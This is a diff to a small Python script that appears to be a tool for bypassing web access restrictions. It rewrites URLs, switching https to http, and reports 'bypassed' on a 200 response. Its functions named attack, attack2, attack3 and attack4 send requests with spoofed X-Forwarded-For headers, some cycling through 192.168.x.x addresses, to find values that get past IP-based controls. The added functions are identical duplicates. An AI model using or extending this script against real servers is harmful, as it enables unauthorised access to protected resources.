@@ -10,7 +10,7 @@ def test2(url):
     newurl = x = re.findall("/.{1,100}", url)
     newurl = newurl[0].replace("/","//")
     newurl = newurl.replace("////","//")
-    newurl = ("https:"+newurl)
+    newurl = ("http:"+newurl)
     r = requests.get(newurl)
     if(r.status_code == 200):
         print("bypassed: ",newurl)
@@ -34,6 +34,14 @@ def attack(number,url):
         if (s.status_code == 200):
             print("X-Forwarded-For: 192.168.{}.{}".format(n,i))
 def attack2(number,url):
+        s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
+        if (s.status_code == 200):
+            print("X-Forwarded-For:", number)
+def attack3(number,url):
+        s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
+        if (s.status_code == 200):
+            print("X-Forwarded-For:", number)
+def attack4(number,url):
         s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
         if (s.status_code == 200):
             print("X-Forwarded-For:", number)
